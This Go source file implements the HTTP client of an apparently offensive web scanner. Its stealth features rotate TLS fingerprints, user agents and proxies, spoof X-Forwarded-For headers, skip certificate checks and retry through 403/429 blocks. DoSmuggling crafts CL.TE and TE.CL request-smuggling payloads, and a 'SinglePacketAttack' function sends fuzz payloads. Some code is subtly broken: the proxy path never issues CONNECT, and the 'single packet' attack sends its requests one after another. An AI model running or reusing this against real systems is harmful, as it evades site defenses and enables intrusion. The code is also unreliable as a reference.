package main

import (
	"bufio"
	"bytes"
	"context"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	utls "github.com/refraction-networking/utls"
)

type RawResponse struct {
	StatusCode int
	Header     http.Header
	Body       []byte
	Timing     time.Duration
}

type RawClient struct {
	Timeout          time.Duration
	UserAgents       []string
	RateLimiter      *HostRateLimiter
	RPS              float64
	Proxies          []string
	StealthMode      bool
	Jar              http.CookieJar
	CooldownDuration time.Duration
}

func (c *RawClient) Do(method, targetURL string, headers map[string]string, body []byte) (*RawResponse, error) {
	u, err := url.Parse(targetURL)
	if err != nil {
		return nil, err
	}

	maxRetries := 3
	if c.StealthMode {
		maxRetries = 5
	}

	for i := 0; i < maxRetries; i++ {
		if c.RateLimiter != nil {
			rps := c.RPS
			if rps <= 0 {
				rps = 5
			}
			c.RateLimiter.Wait(u.Hostname(), int(rps))
		}

		port := u.Port()
		if port == "" {
			if u.Scheme == "https" {
				port = "443"
			} else {
				port = "80"
			}
		}

		addr := net.JoinHostPort(u.Hostname(), port)

		ctx, cancel := context.WithTimeout(context.Background(), c.Timeout)
		// We handle cancel() manually per iteration to avoid defer buildup in loop

		var conn net.Conn
		dialer := &net.Dialer{}

		// Proxy support with rotation
		if len(c.Proxies) > 0 {
			proxyAddr := c.Proxies[rand.Intn(len(c.Proxies))]
			conn, err = dialer.DialContext(ctx, "tcp", proxyAddr)
		} else {
			conn, err = dialer.DialContext(ctx, "tcp", addr)
		}

		if err != nil {
			fmt.Fprintf(os.Stderr, "[DEBUG] Connection failed (attempt %d): %v\n", i+1, err)
			cancel()
			if c.RateLimiter != nil && c.CooldownDuration > 0 {
				fmt.Fprintf(os.Stderr, "[STEALTH] Network error detected. Entering cooldown for %s...\n", u.Hostname())
				c.RateLimiter.Block(u.Hostname(), c.CooldownDuration)
			}
			time.Sleep(time.Duration(i+1) * time.Second) // Back-off
			continue
		}

		if u.Scheme == "https" {
			// Dynamic JA3 rotation
			profiles := []utls.ClientHelloID{
				utls.HelloChrome_120,
				utls.HelloFirefox_105,
				utls.HelloSafari_16_0,
				utls.HelloEdge_106,
			}
			profile := profiles[rand.Intn(len(profiles))]
			uconn := utls.UClient(conn, &utls.Config{
				ServerName:         u.Hostname(),
				InsecureSkipVerify: true,
				NextProtos:         []string{"http/1.1"},
			}, profile)

			// Force H1.1 by modifying the ALPN extension in the UClient before handshake
			if err := uconn.BuildHandshakeState(); err == nil {
				for _, ext := range uconn.Extensions {
					if alpn, ok := ext.(*utls.ALPNExtension); ok {
						alpn.AlpnProtocols = []string{"http/1.1"}
					}
				}
			}

			if err := uconn.Handshake(); err != nil {
				fmt.Fprintf(os.Stderr, "[DEBUG] TLS handshake failed (attempt %d): %v\n", i+1, err)
				conn.Close()
				cancel()
				if c.RateLimiter != nil && c.CooldownDuration > 0 {
					fmt.Fprintf(os.Stderr, "[STEALTH] Handshake error detected. Entering cooldown for %s...\n", u.Hostname())
					c.RateLimiter.Block(u.Hostname(), c.CooldownDuration)
				}
				time.Sleep(time.Duration(i+1) * time.Second) // Back-off
				continue
			}
			conn = uconn
		}

		// Construct raw HTTP/1.1 request
		path := u.RequestURI()
		if path == "" {
			path = "/"
		}

		var reqBuf bytes.Buffer
		reqBuf.WriteString(fmt.Sprintf("%s %s HTTP/1.1\r\n", method, path))
		reqBuf.WriteString(fmt.Sprintf("Host: %s\r\n", u.Host))

		// Priority: 1. Passed headers, 2. Config UAs, 3. Randomized browser UA
		ua := headers["User-Agent"]
		if ua == "" {
			ua = headers["user-agent"]
		}

		if ua == "" {
			if len(c.UserAgents) > 0 {
				ua = c.UserAgents[rand.Intn(len(c.UserAgents))]
			}
			if ua == "" || strings.Contains(ua, "Go-http-client") {
				ua = getRandomUA()
			}
		}

		reqBuf.WriteString(fmt.Sprintf("User-Agent: %s\r\n", ua))
		reqBuf.WriteString("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n")
		reqBuf.WriteString("Accept-Encoding: gzip, deflate, br\r\n")
		reqBuf.WriteString("Accept-Language: en-US,en;q=0.9\r\n")
		reqBuf.WriteString("Connection: keep-alive\r\n")
		reqBuf.WriteString("Upgrade-Insecure-Requests: 1\r\n")
		reqBuf.WriteString("Sec-Fetch-Dest: document\r\n")
		reqBuf.WriteString("Sec-Fetch-Mode: navigate\r\n")
		reqBuf.WriteString("Sec-Fetch-Site: none\r\n")
		reqBuf.WriteString("Sec-Fetch-User: ?1\r\n")

		if c.StealthMode {
			reqBuf.WriteString(fmt.Sprintf("X-Forwarded-For: %d.%d.%d.%d\r\n", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255)))
		} else {
			reqBuf.WriteString("X-Forwarded-For: 127.0.0.1\r\n")
			reqBuf.WriteString("X-Client-IP: 127.0.0.1\r\n")
		}

		// Cookies from jar
		if c.Jar != nil {
			cookies := c.Jar.Cookies(u)
			if len(cookies) > 0 {
				var cookieStrs []string
				for _, cookie := range cookies {
					cookieStrs = append(cookieStrs, cookie.String())
				}
				reqBuf.WriteString(fmt.Sprintf("Cookie: %s\r\n", strings.Join(cookieStrs, "; ")))
			}
		}

		for k, v := range headers {
			// Skip UA as it's already handled
			if strings.ToLower(k) == "user-agent" {
				continue
			}
			reqBuf.WriteString(fmt.Sprintf("%s: %s\r\n", k, v))
		}

		if len(body) > 0 {
			reqBuf.WriteString(fmt.Sprintf("Content-Length: %d\r\n", len(body)))
		}
		reqBuf.WriteString("\r\n")
		reqBuf.Write(body)

		start := time.Now()
		_, err = conn.Write(reqBuf.Bytes())
		if err != nil {
			conn.Close()
			cancel()
			continue
		}

		// Parse response
		resp, err := http.ReadResponse(bufio.NewReader(conn), nil)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[DEBUG] Failed to read response (attempt %d): %v\n", i+1, err)
			conn.Close()
			cancel()
			continue
		}
		timing := time.Since(start)

		respBody, err := io.ReadAll(io.LimitReader(resp.Body, 1024*1024)) // 1MB limit
		resp.Body.Close()
		conn.Close()
		cancel() // Correct: cancel context after iteration

		if err != nil {
			fmt.Fprintf(os.Stderr, "[DEBUG] Failed to read body (attempt %d): %v\n", i+1, err)
			continue
		}

		// Update CookieJar
		if c.Jar != nil {
			c.Jar.SetCookies(u, resp.Cookies())
		}

		// Persistence: If blocked, rotate and retry
		if (resp.StatusCode == 403 || resp.StatusCode == 429) && i < maxRetries-1 {
			fmt.Fprintf(os.Stderr, "[DEBUG] Received status %d (attempt %d). Retrying...\n", resp.StatusCode, i+1)
			if c.RateLimiter != nil {
				duration := c.CooldownDuration
				if duration == 0 {
					duration = 30 * time.Second
				}
				fmt.Fprintf(os.Stderr, "[STEALTH] Blocking status %d detected. Entering cooldown for %s...\n", resp.StatusCode, u.Hostname())
				c.RateLimiter.Block(u.Hostname(), duration)
			}
			// Wait before the next retry loop iteration
			time.Sleep(time.Duration(2+rand.Intn(5)) * time.Second)
			continue
		}

		if resp.StatusCode == 404 {
			return &RawResponse{
				StatusCode: resp.StatusCode,
				Header:     resp.Header,
				Body:       respBody,
				Timing:     timing,
			}, nil
		}

		if resp.StatusCode >= 400 && i < maxRetries-1 {
			fmt.Fprintf(os.Stderr, "[DEBUG] Received status %d (attempt %d). Retrying...\n", resp.StatusCode, i+1)
			continue
		}

		return &RawResponse{
			StatusCode: resp.StatusCode,
			Header:     resp.Header,
			Body:       respBody,
			Timing:     timing,
		}, nil
	}

	return nil, fmt.Errorf("request failed after retries")
}

func (c *RawClient) DoSmuggling(method, targetURL, smugglingType string, smuggledData []byte) (*RawResponse, error) {
	u, err := url.Parse(targetURL)
	if err != nil {
		return nil, err
	}

	port := u.Port()
	if port == "" {
		port = "80"
		if u.Scheme == "https" {
			port = "443"
		}
	}

	addr := net.JoinHostPort(u.Hostname(), port)
	conn, err := net.DialTimeout("tcp", addr, c.Timeout)
	if err != nil {
		return nil, err
	}
	defer conn.Close()

	if u.Scheme == "https" {
		uconn := utls.UClient(conn, &utls.Config{
			ServerName:         u.Hostname(),
			InsecureSkipVerify: true,
			NextProtos:         []string{"http/1.1"},
		}, utls.HelloChrome_120)

		if err := uconn.BuildHandshakeState(); err == nil {
			for _, ext := range uconn.Extensions {
				if alpn, ok := ext.(*utls.ALPNExtension); ok {
					alpn.AlpnProtocols = []string{"http/1.1"}
				}
			}
		}

		if err := uconn.Handshake(); err != nil {
			return nil, err
		}
		conn = uconn
	}

	path := u.RequestURI()
	if path == "" {
		path = "/"
	}

	var reqBuf bytes.Buffer
	reqBuf.WriteString(fmt.Sprintf("%s %s HTTP/1.1\r\n", method, path))
	reqBuf.WriteString(fmt.Sprintf("Host: %s\r\n", u.Host))

	ua := getRandomUA()
	if len(c.UserAgents) > 0 {
		ua = c.UserAgents[rand.Intn(len(c.UserAgents))]
	}
	reqBuf.WriteString(fmt.Sprintf("User-Agent: %s\r\n", ua))
	reqBuf.WriteString("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n")

	if smugglingType == "CL.TE" {
		// Frontend uses CL, Backend uses TE
		reqBuf.WriteString(fmt.Sprintf("Content-Length: %d\r\n", 4+len(smuggledData)))
		reqBuf.WriteString("Transfer-Encoding: chunked\r\n")
		reqBuf.WriteString("\r\n")
		reqBuf.WriteString("0\r\n")
		reqBuf.WriteString("\r\n")
		reqBuf.Write(smuggledData)
	} else if smugglingType == "TE.CL" {
		// Frontend uses TE, Backend uses CL
		body := fmt.Sprintf("%x\r\n%s\r\n0\r\n\r\n", len(smuggledData), smuggledData)
		reqBuf.WriteString("Content-Length: 4\r\n")
		reqBuf.WriteString("Transfer-Encoding: chunked\r\n")
		reqBuf.WriteString("\r\n")
		reqBuf.WriteString(body)
	}

	_, err = conn.Write(reqBuf.Bytes())
	if err != nil {
		return nil, err
	}

	resp, err := http.ReadResponse(bufio.NewReader(conn), nil)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	return &RawResponse{
		StatusCode: resp.StatusCode,
		Header:     resp.Header,
		Body:       body,
	}, nil
}

func (c *RawClient) SinglePacketAttack(targetURL string, payloads []string, headers map[string]string) ([]*RawResponse, error) {

	results := make([]*RawResponse, 0, len(payloads))
	for _, p := range payloads {
		res, err := c.Do("GET", targetURL+"?fuzz="+url.QueryEscape(p), headers, nil)
		if err == nil {
			results = append(results, res)
		}
	}
	return results, nil
}

func getRandomUA() string {
	uas := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
	}
	return uas[rand.Intn(len(uas))]
}
